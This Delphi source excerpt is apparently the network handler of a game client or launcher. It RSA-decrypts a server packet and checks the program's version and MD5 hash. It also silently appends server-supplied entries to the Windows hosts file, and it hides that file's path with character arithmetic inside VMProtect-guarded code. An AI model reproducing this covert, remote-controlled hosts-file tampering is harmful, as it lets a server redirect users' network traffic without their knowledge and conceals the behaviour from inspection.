procedure TFrmMain.ClientSrvSocketRead(Sender:TObject; Socket:TCustomWinSocket);
type
  PSocketHeader = ^TSocketHeader;

  TSocketHeader = packed record
    Flag1:DWORD;
    Flag2:DWORD;
    Len:DWORD;
  end;

  PSendPacket = ^TSendPacket;

  TSendPacket = packed record
    sUrl:string[160];
    boVer:Boolean;
    sVer:string[20];
    boMd5:Boolean;
    sMD5:string[32];
    boWinUrl:Boolean;
    sWinUrl:string[160];
    boHost:Boolean;
    nHostLen:Integer;
  end;
var
  Header:PSocketHeader;
  RecvLen, TempLen:Integer;
  BlockSize, BlockCount:Integer;
  I, J, DestSize, Len:Integer;
  RSABuf:PChar;
  PIn, POut:PByte;
  Packet:PSendPacket;
  SL:TStringList;
  SL2:TStringList;
  S:string;
  AddS1, AddS2, S1, S2:string;
  IsFound, IsChanged, IsExit:Boolean;
  HostFileName:string;
begin
  {$IF PRIVATE_CLIENT = 1}
  {.$I AddVmpFeatureCode_M.inc}
  {$IFEND}

  RecvLen := Socket.ReceiveLength;
  if RecvLen = 0 then
    Exit;

  if FClientSrvRSA = nil then begin
    Socket.ReceiveText;
    Exit;
  end;

  TempLen := FClientSrvRecvLen + RecvLen;
  if TempLen > FClientSrvBufLen then begin
    FClientSrvBufLen := TempLen;

    if FClientSrvBuf = nil then
      GetMem(FClientSrvBuf, FClientSrvBufLen)
    else
      ReallocMem(FClientSrvBuf, FClientSrvBufLen);
  end;

  Move(Socket.ReceiveText[1], PChar(Cardinal(FClientSrvBuf) + FClientSrvRecvLen)^, RecvLen);
  FClientSrvRecvLen := TempLen;

  if FClientSrvRecvLen > SizeOf(TSocketHeader) then begin
    Header := PSocketHeader(FClientSrvBuf);
    if FClientSrvRecvLen = SizeOf(TSocketHeader) + Header.Len then begin
      if (Header.Flag1 = $FF002255) and (Header.Flag2 = $AA123576) then begin
        {$IF PRIVATE_CLIENT = 0}
        {$I VMProtectBegin.inc}
        {$IFEND}
        BlockSize := RSA_SIZE(FClientSrvRSA);
        BlockCount := FClientSrvRecvLen div BlockSize;

        GetMem(RSABuf, BlockSize * BlockCount);
        try
          ZeroMemory(RSABuf, BlockSize * BlockCount);

          PIn := PByte(Cardinal(FClientSrvBuf) + SizeOf(TSocketHeader));
          POut := PByte(RSABuf);
          DestSize := 0;
          for I := 0 to BlockCount - 1 do begin
            Len := RSA_Public_decrypt(BlockSize, PIn, POut, FClientSrvRSA, RSA_PKCS1_PADDING);
            Inc(PIn, BlockSize);
            Inc(POut, Len);
            Inc(DestSize, Len);
          end;

          Packet := PSendPacket(RSABuf);
          FDownUrl := Packet.sURL;

          TempLen := SizeOf(TSendPacket);
          if (Packet.boHost) and (Packet.nHostLen > 0) and (DestSize - TempLen = Packet.nHostLen) then begin
            SetLength(S, Packet.nHostLen);
            PIn := PByte(Cardinal(RSABuf) + TempLen);

            Move(PIn^, S[1], Packet.nHostLen);

            SL2 := TStringList.Create;
            try
              // C:\Windows\System32\drivers\etc\hosts
              HostFileName := Char(110 - 43) + Char(179 - 121) + Char(8 + 84) + Char(61 + 26) + Char(68 + 37) + Char(74 + 36) + Char(132 - 32) + Char(59 + 52) + Char(20 + 99) + Char(193 - 78) + Char(100 - 8) + Char(19 + 64) + Char(120 + 1) + Char(151 - 36) + Char(155 - 39) + Char(167 - 66) + Char(132 - 23) + Char(86 - 35) + Char(160 - 110) + Char(12 + 80) + Char(103 - 3) + Char(75 + 39) + Char(52 + 53) + Char(141 - 23) + Char(13 + 88) + Char(13 + 101) + Char(15 + 100) + Char(15 + 77) + Char(53 + 48) + Char(43 + 73) + Char(55 + 44) + Char(196 - 104) + Char(51 + 53) + Char(112 - 1) + Char(117 - 2) + Char(76 + 40) + Char(189 - 74);

              SL2.LoadFromFile(HostFileName);
              SL := TStringList.Create;
              try
                IsChanged := False;

                SL.Text := S;
                for I := 0 to SL.Count - 1 do begin
                  AddS2 := GetValidStr3(SL[I], AddS1, [' ', #9]);

                  IsFound := False;
                  for J := 0 to SL2.Count - 1 do begin
                    S2 := GetValidStr3(SL2[J], S1, [' ', #9]);

                    if SameText(AddS2, S2) and SameText(AddS1, S1) then begin
                      IsFound := True;
                      Break;
                    end;
                  end;

                  if not IsFound then begin
                    SL2.Add(AddS1 + ' ' + AddS2);
                    IsChanged := True;
                  end;
                end;

                if IsChanged then
                  SL2.SaveToFile(HostFileName);
              finally
                SL.Free;
              end;
            finally
              SL2.Free;
            end;
          end;

          IsExit := False;

          // 版本号比较
          if Packet.boVer then begin
            if not SameText(DecryString_LF(g_sVersion), Packet.sVer) then begin
              tmr_v.Enabled := True;
              IsExit := True;
            end;
          end;

          // 检查md5
          if (not IsExit) and Packet.boMd5 then begin
            if not SameText(RivestFile(Application.ExeName), Packet.sMd5) then begin
              tmr_m.Enabled := True;
              IsExit := True;
            end;
          end;

          if (not IsExit) and Packet.boWinUrl then begin
            FExitPoputWinUrl := Packet.sWinUrl;
          end;
        finally
          FreeMem(RSABuf, BlockSize * BlockCount)
        end;

        FreeMem(FClientSrvBuf, FClientSrvBufLen);
        FClientSrvBuf := nil;
        {$IF PRIVATE_CLIENT = 0}
        {$I VMProtectEnd.inc}
        {$IFEND}
      end;
    end;
  end;
end;
{$IFEND}

